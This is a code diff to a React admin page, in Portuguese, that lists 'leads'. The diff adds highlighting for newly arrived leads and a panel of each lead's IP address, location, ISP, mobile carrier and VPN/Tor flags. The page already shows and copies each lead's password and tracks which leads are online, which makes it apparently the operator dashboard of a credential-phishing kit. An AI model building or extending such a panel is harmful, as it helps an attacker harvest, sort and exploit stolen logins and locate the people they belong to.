@@ -1,7 +1,7 @@
-import { useEffect, useState } from "react";
+import { useEffect, useState, useRef } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import { leadRepository, type Lead } from "@/repositories";
-import { Search, RefreshCw, Eye, EyeOff, Trash2, Copy, CheckSquare, Square, Archive, ArchiveRestore, Tag, X } from "lucide-react";
+import { Search, RefreshCw, Eye, EyeOff, Trash2, Copy, CheckSquare, Square, Archive, ArchiveRestore, Tag, X, Globe, Shield, Wifi, Smartphone } from "lucide-react";
 import OperatorIcon from "@/components/OperatorIcon";
 import {
   Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription,
@@ -31,6 +31,8 @@ export default function AdminLeadsPage() {
   const [visiblePwds, setVisiblePwds] = useState<Set<string>>(new Set());
   const [selectedPwdVisible, setSelectedPwdVisible] = useState(false);
   const [onlineLeadIds, setOnlineLeadIds] = useState<Set<string>>(new Set());
+  const [newLeadIds, setNewLeadIds] = useState<Set<string>>(new Set());
+  const knownLeadIdsRef = useRef<Set<string>>(new Set());
 
   const togglePwd = (id: string) =>
     setVisiblePwds((prev) => { const s = new Set(prev); s.has(id) ? s.delete(id) : s.add(id); return s; });
@@ -54,6 +56,28 @@ export default function AdminLeadsPage() {
     setLoading(true);
     try {
       const result = await leadRepository.findAll({ archived: showArchived, limit: 50 });
+      // Detect new leads (skip on first load)
+      if (knownLeadIdsRef.current.size > 0) {
+        const incoming = new Set<string>();
+        for (const lead of result.data) {
+          if (!knownLeadIdsRef.current.has(lead.id)) {
+            incoming.add(lead.id);
+          }
+        }
+        if (incoming.size > 0) {
+          setNewLeadIds((prev) => new Set([...prev, ...incoming]));
+          // Remove highlight after 10s
+          setTimeout(() => {
+            setNewLeadIds((prev) => {
+              const next = new Set(prev);
+              for (const id of incoming) next.delete(id);
+              return next;
+            });
+          }, 10_000);
+        }
+      }
+      // Update known IDs
+      knownLeadIdsRef.current = new Set(result.data.map((l) => l.id));
       setLeads(result.data);
       setNextCursor(result.nextCursor);
       setChecked(new Set());
@@ -284,7 +308,7 @@ export default function AdminLeadsPage() {
                 <tr><td colSpan={11} className="px-4 py-8 text-center text-muted-foreground font-mono text-xs">Nenhum lead encontrado</td></tr>
               ) : (
                 filtered.map((lead) => (
-                  <tr key={lead.id} className={`border-b border-border last:border-0 hover:bg-muted/30 transition-colors ${checked.has(lead.id) ? "bg-primary/5" : ""}`}>
+                  <tr key={lead.id} className={`border-b border-border last:border-0 hover:bg-muted/30 transition-colors ${checked.has(lead.id) ? "bg-primary/5" : ""} ${newLeadIds.has(lead.id) ? "animate-pulse-highlight" : ""}`}>
                     <td className="px-3 py-3 text-center">
                       <button onClick={() => toggleCheck(lead.id)} className="text-muted-foreground hover:text-foreground transition-colors">
                         {checked.has(lead.id) ? <CheckSquare className="h-4 w-4 text-primary" /> : <Square className="h-4 w-4" />}
@@ -424,6 +448,90 @@ export default function AdminLeadsPage() {
                   )}
                 </span>
               </div>
+              {/* IP Details section */}
+              {(() => {
+                const ip = selected.ip_details as Record<string, unknown> | null | undefined;
+                if (!ip) return null;
+                return (
+                  <div className="mt-2 rounded-lg border border-border bg-muted/20 p-3 space-y-2">
+                    <p className="text-[10px] font-mono uppercase tracking-wider text-muted-foreground flex items-center gap-1">
+                      <Globe className="h-3 w-3" /> Informações de Rede
+                    </p>
+                    {/* Location */}
+                    {(ip.city || ip.region || ip.country) && (
+                      <div className="flex justify-between text-xs">
+                        <span className="text-muted-foreground font-mono">Local</span>
+                        <span className="font-mono text-foreground">
+                          {[ip.city, ip.region, ip.country].filter(Boolean).join(", ")}
+                        </span>
+                      </div>
+                    )}
+                    {ip.timezone && (
+                      <div className="flex justify-between text-xs">
+                        <span className="text-muted-foreground font-mono">Fuso</span>
+                        <span className="font-mono text-foreground">{ip.timezone as string}</span>
+                      </div>
+                    )}
+                    {/* Network */}
+                    {ip.ip && (
+                      <div className="flex justify-between text-xs">
+                        <span className="text-muted-foreground font-mono">IP</span>
+                        <span className="font-mono text-foreground">{ip.ip as string}</span>
+                      </div>
+                    )}
+                    {(ip.asn || ip.as_name) && (
+                      <div className="flex justify-between text-xs">
+                        <span className="text-muted-foreground font-mono">ISP</span>
+                        <span className="font-mono text-foreground text-right max-w-[200px] truncate">
+                          {[ip.asn, ip.as_name].filter(Boolean).join(" ")}
+                        </span>
+                      </div>
+                    )}
+                    {ip.hostname && (
+                      <div className="flex justify-between text-xs">
+                        <span className="text-muted-foreground font-mono">Hostname</span>
+                        <span className="font-mono text-foreground text-right max-w-[200px] truncate">{ip.hostname as string}</span>
+                      </div>
+                    )}
+                    {/* Mobile carrier */}
+                    {ip.mobile_carrier && (
+                      <div className="flex justify-between text-xs">
+                        <span className="text-muted-foreground font-mono flex items-center gap-1"><Smartphone className="h-3 w-3" /> Operadora</span>
+                        <span className="font-mono text-foreground">{ip.mobile_carrier as string}</span>
+                      </div>
+                    )}
+                    {/* Security flags */}
+                    {(() => {
+                      const flags: string[] = [];
+                      if (ip.is_vpn) flags.push("VPN");
+                      if (ip.is_proxy) flags.push("Proxy");
+                      if (ip.is_tor) flags.push("Tor");
+                      if (ip.is_hosting) flags.push("Hosting");
+                      if (ip.is_relay) flags.push("Relay");
+                      if (ip.is_satellite) flags.push("Satélite");
+                      if (ip.is_anycast) flags.push("Anycast");
+                      if (flags.length === 0) return null;
+                      return (
+                        <div className="flex justify-between text-xs items-center">
+                          <span className="text-muted-foreground font-mono flex items-center gap-1"><Shield className="h-3 w-3" /> Flags</span>
+                          <div className="flex gap-1 flex-wrap justify-end">
+                            {flags.map((f) => (
+                              <span key={f} className="rounded-full bg-destructive/15 px-1.5 py-0.5 text-[10px] font-medium text-destructive">{f}</span>
+                            ))}
+                          </div>
+                        </div>
+                      );
+                    })()}
+                    {/* Device */}
+                    <div className="flex justify-between text-xs">
+                      <span className="text-muted-foreground font-mono flex items-center gap-1"><Wifi className="h-3 w-3" /> Tipo</span>
+                      <span className="font-mono text-foreground">
+                        {ip.is_mobile ? "Móvel" : "Desktop"} · {(ip.as_type as string) || "—"}
+                      </span>
+                    </div>
+                  </div>
+                );
+              })()}
               <button
                 onClick={() => { handleCopyOne(selected); }}
                 className="mt-2 flex w-full items-center justify-center gap-2 rounded-lg border border-border py-2 text-sm font-medium text-foreground hover:bg-muted transition-colors"
